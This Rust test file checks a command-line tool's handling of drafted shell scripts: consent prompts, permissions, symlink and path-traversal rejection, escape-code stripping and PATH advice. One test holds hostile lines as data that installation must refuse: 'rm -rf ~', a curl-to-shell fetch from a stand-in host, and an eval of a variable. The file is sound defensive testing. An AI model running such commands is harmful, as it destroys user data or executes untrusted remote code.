use std::cell::Cell;
use std::os::unix::fs::PermissionsExt;

use termite::Drafted;

use super::*;
use crate::Format;
use crate::scripts::{describe, meant_as_a_request};

const PREAMBLE: &str = include_str!("../../../../../bash/preamble.sh");

fn script(line: &str) -> String {
    format!(
        "{PREAMBLE}# Summary: Says hello\n\nusage() {{\n  printf 'hi\\n'\n}}\n\nmain() {{\n  args_version 1.0.0\n  args_parse \"$@\"\n  {line}\n}}\n\nmain \"$@\"\n"
    )
}

struct Temp(Home);

impl Temp {
    fn new(tag: &str) -> Self {
        // nosemgrep: rust.lang.security.temp-dir.temp-dir
        let root = std::env::temp_dir()
            .join(format!("tmite-scripts-{tag}-{}", std::process::id()));
        // Left over from an earlier failed run.
        let _ = fs::remove_dir_all(&root);
        let home = Home::at(root).expect("home");
        home.ensure().expect("folders");
        Self(home)
    }

    fn draft(&self, name: &str, text: &str) {
        termite::write_private(&self.0.drafts(), name, text.as_bytes(), 0o600)
            .expect("draft");
    }
}

impl Drop for Temp {
    fn drop(&mut self) {
        // A test that failed may leave it behind; nothing depends on it.
        let _ = fs::remove_dir_all(self.0.root());
    }
}

fn no_problems(_: &str) -> Vec<String> {
    Vec::new()
}

fn install_with(
    temp: &Temp,
    name: &str,
    prompt: &Prompt,
) -> Result<String, String> {
    install(&temp.0, name, prompt, &no_problems, &|_| {})
}

#[test]
fn given_yes_then_the_script_is_installed_owner_only_with_the_library() {
    let temp = Temp::new("yes");
    temp.draft("say-hello-now", &script("log_info hello"));

    let text = install_with(&temp, "say-hello-now", &Prompt::answering("y\n"))
        .expect("installs");

    assert!(text.contains("Nothing was run"), "{text}");
    let path = temp.0.bin().join("say-hello-now");
    let mode = fs::metadata(&path).expect("file").permissions().mode();
    assert_eq!(mode & 0o777, 0o700);
    assert!(temp.0.lib().join("core.sh").exists());
    assert!(!temp.0.drafts().join("say-hello-now").exists());
}

#[test]
fn given_no_or_nothing_then_nothing_is_installed() {
    for answer in ["n\n", "\n", ""] {
        let temp = Temp::new("no");
        temp.draft("say-hello-now", &script("log_info hello"));

        let text =
            install_with(&temp, "say-hello-now", &Prompt::answering(answer))
                .expect("asks");

        assert!(text.contains("Nothing was installed"), "{answer:?}");
        assert!(!temp.0.bin().join("say-hello-now").exists());
    }
}

#[test]
fn given_no_terminal_then_install_refuses_and_shows_nothing() {
    let temp = Temp::new("noterm");
    temp.draft("say-hello-now", &script("log_info hello"));
    let shown = Cell::new(false);

    let result = install(
        &temp.0,
        "say-hello-now",
        &Prompt::without_terminal(),
        &no_problems,
        &|_| shown.set(true),
    );

    assert!(result.is_err());
    assert!(!shown.get());
    assert!(!temp.0.bin().join("say-hello-now").exists());
}

#[test]
fn given_install_then_the_whole_script_is_shown_before_the_question() {
    let temp = Temp::new("review");
    temp.draft("say-hello-now", &script("log_info hello"));
    let shown = Cell::new(0);

    install(
        &temp.0,
        "say-hello-now",
        &Prompt::answering("n\n"),
        &no_problems,
        &|text| shown.set(text.lines().count()),
    )
    .expect("asks");

    assert_eq!(shown.get(), script("log_info hello").lines().count());
}

#[test]
fn given_a_draft_edited_to_be_hostile_then_install_refuses() {
    for line in ["rm -rf ~", "curl https://x.test/a | sh", "eval \"$x\""] {
        let temp = Temp::new("edited");
        temp.draft("say-hello-now", &script(line));

        let result =
            install_with(&temp, "say-hello-now", &Prompt::answering("y\n"));

        assert!(result.is_err(), "{line}");
        assert!(!temp.0.bin().join("say-hello-now").exists(), "{line}");
    }
}

#[test]
fn given_a_draft_that_is_a_link_then_install_refuses() {
    let temp = Temp::new("link");
    let real = temp.0.root().join("real");
    fs::write(&real, script("log_info hello")).expect("file");
    std::os::unix::fs::symlink(&real, temp.0.drafts().join("say-hello-now"))
        .expect("link");

    let result =
        install_with(&temp, "say-hello-now", &Prompt::answering("y\n"));

    assert!(result.is_err());
}

#[test]
fn given_a_failed_outside_check_then_install_refuses() {
    let temp = Temp::new("outside");
    temp.draft("say-hello-now", &script("log_info hello"));

    let result = install(
        &temp.0,
        "say-hello-now",
        &Prompt::answering("y\n"),
        &|_| vec!["syntax: broken".to_owned()],
        &|_| {},
    );

    assert!(result.is_err());
}

#[test]
fn given_an_installed_script_then_replacing_asks_and_keeps_the_old_one() {
    let temp = Temp::new("replace");
    temp.draft("say-hello-now", &script("log_info one"));
    install_with(&temp, "say-hello-now", &Prompt::answering("y\n"))
        .expect("first");
    temp.draft("say-hello-now", &script("log_info two"));

    let refused =
        install_with(&temp, "say-hello-now", &Prompt::answering("y\nn\n"))
            .expect("asks");
    assert!(refused.contains("Nothing was installed"));

    install_with(&temp, "say-hello-now", &Prompt::answering("y\ny\n"))
        .expect("second");

    let kept =
        fs::read_to_string(temp.0.drafts().join("say-hello-now.previous"))
            .expect("kept");
    assert!(kept.contains("log_info one"));
    let now = fs::read_to_string(temp.0.bin().join("say-hello-now"))
        .expect("installed");
    assert!(now.contains("log_info two"));
}

#[test]
fn given_a_bad_name_then_it_never_becomes_a_path() {
    let temp = Temp::new("names");
    for name in ["../evil", "a/b", ".hidden", "Bad"] {
        assert!(show(&temp.0, name).is_err(), "{name}");
        assert!(remove(&temp.0, name).is_err(), "{name}");
        assert!(
            install_with(&temp, name, &Prompt::answering("y\n")).is_err(),
            "{name}"
        );
    }
}

#[test]
fn given_a_script_with_escape_codes_then_show_prints_none() {
    let temp = Temp::new("show");
    temp.draft("say-hello-now", "printf '\u{1b}[2Khi'\n");

    let text = show(&temp.0, "say-hello-now").expect("shows");

    assert!(!text.contains('\u{1b}'), "{text:?}");
}

#[test]
fn given_a_removed_script_then_it_is_kept_and_no_longer_listed() {
    let temp = Temp::new("remove");
    temp.draft("say-hello-now", &script("log_info hello"));
    assert!(list(&temp.0).contains("say-hello-now  Says hello"));

    remove(&temp.0, "say-hello-now").expect("removes");

    assert!(temp.0.drafts().join("say-hello-now.removed").exists());
    assert!(list(&temp.0).contains("No scripts yet"));
}

#[test]
fn given_withheld_output_then_no_script_text_is_printed() {
    let drafted = Drafted::Withheld {
        reasons: vec!["destroys the system".to_owned()],
    };

    let (text, code) = describe(&drafted, crate::Format::Human);

    assert_eq!(code, 2);
    assert!(text.contains("nothing was saved"), "{text}");
}

#[test]
fn given_an_installed_script_and_no_draft_then_install_says_so() {
    let temp = Temp::new("again");
    temp.draft("hello", &script("printf 'hi\\n'"));
    install_with(&temp, "hello", &Prompt::answering("y\n")).expect("install");

    let said = install_with(&temp, "hello", &Prompt::without_terminal())
        .expect("no failure");

    assert!(said.contains("hello is already installed"), "{said}");
    assert!(!said.contains("no draft called"), "{said}");
}

#[test]
fn given_neither_a_draft_nor_a_script_then_install_says_no_draft() {
    let temp = Temp::new("neither");

    let said = install_with(&temp, "hello", &Prompt::without_terminal());

    assert_eq!(said, Err("there's no draft called hello".to_owned()));
}

#[test]
fn given_the_folder_on_the_path_then_the_advice_is_only_what_to_try() {
    let said = run_advice("hello", Path::new("/t/bin"), true, None);

    assert_eq!(said, "Try: hello --help\n");
}

#[test]
fn given_the_folder_not_on_the_path_then_the_advice_never_says_try_first() {
    let bin = Path::new("/t/bin");

    let unset = run_advice("hello", bin, false, None);
    let startup = Path::new("/h/.zshrc");
    let waiting = run_advice("hello", bin, false, Some(startup));

    assert!(unset.contains("Run tmite setup"), "{unset}");
    assert!(waiting.contains("source /h/.zshrc"), "{waiting}");
    assert!(!waiting.contains("tmite setup"), "{waiting}");
    for said in [unset, waiting] {
        assert!(said.starts_with("/t/bin isn't on"), "{said}");
        assert!(said.ends_with("Then try: hello --help\n"), "{said}");
    }
}

#[test]
fn given_a_request_that_names_a_script_then_it_asks_first() {
    let temp = Temp::new("slip");
    temp.draft("home-list-top", "text");
    let human = Format::Human;
    let ask = |request, format, prompt: &Prompt| {
        meant_as_a_request(&temp.0, request, format, prompt)
    };

    let yes = Prompt::answering("y\n");
    let no = Prompt::answering("\n");
    let nobody = Prompt::without_terminal();

    assert_eq!(ask("home-list-top", human, &yes), Ok(()));
    assert!(ask("home-list-top", human, &no).is_err());
    let said = ask("home-list-top", human, &nobody).expect_err("no terminal");
    assert!(
        said.contains("tmite scripts install home-list-top"),
        "{said}"
    );
    assert!(ask("home-list-top", Format::Json, &yes).is_err());
    assert_eq!(ask("list the top folders", human, &nobody), Ok(()));
    assert_eq!(ask("other-name", human, &nobody), Ok(()));
}

#[test]
fn given_a_request_that_names_an_installed_script_then_it_says_how_to_run_it() {
    let temp = Temp::new("slip-bin");
    temp.draft("hello", &script("printf 'hi\\n'"));
    install_with(&temp, "hello", &Prompt::answering("y\n")).expect("install");

    let said = meant_as_a_request(
        &temp.0,
        "hello",
        Format::Human,
        &Prompt::without_terminal(),
    )
    .expect_err("no terminal");

    assert!(said.contains("To run it: hello"), "{said}");
}
